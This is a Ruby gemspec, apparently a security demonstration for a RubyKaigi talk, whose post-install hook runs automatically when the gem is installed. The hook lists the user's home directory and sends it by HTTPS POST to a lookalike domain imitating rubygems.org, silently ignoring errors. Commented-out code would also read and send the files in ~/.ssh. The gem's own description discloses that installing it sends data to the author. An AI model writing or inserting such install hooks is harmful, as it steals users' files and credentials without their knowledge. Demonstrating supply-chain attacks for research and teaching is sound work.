require 'net/http'
require 'net/https'

Gem.post_install do
  home = `cd ~; pwd`.gsub("\n", '')
  data = [`cd ~ && ls -all`]

  # DON'T TRY TO UNCOMMENT THAT UNLESS YOU ARE INSANE!
  #
  # Dir.glob("#{home}/.ssh/*", File::FNM_DOTMATCH).each do |file|
  #   begin
  #   next unless File.file?(file)
  #   data << "--- #{file} \n"
  #   data << File.read(file)
  #   rescue
  #   end
  # end

  begin
    uri = URI.parse("https://subygems.org/secrets")
    https = Net::HTTP.new(uri.host,uri.port)
    https.use_ssl = true
    req = Net::HTTP::Post.new(uri.path)
    req.body = data.join("\n")
    https.request(req)
  rescue
  end
end

Gem::Specification.new do |s|
  s.name        = 'rubykaigi-via-post-install'
  s.version     = '1.0.0'
  s.platform    = Gem::Platform::RUBY
  s.license     = 'MIT'
  s.authors     = ['Maciej Mensfeld']
  s.email       = 'maciej@mensfeld.pl'
  s.homepage    = "http://github.com/mensfeld/taking-over-a-gem"
  s.summary     = "Experimental gem to check post_install vulnerability. Made for RubyKaigi"
  s.description = "Please don't install this gem unless you want your home ls to be sent to me!"
end
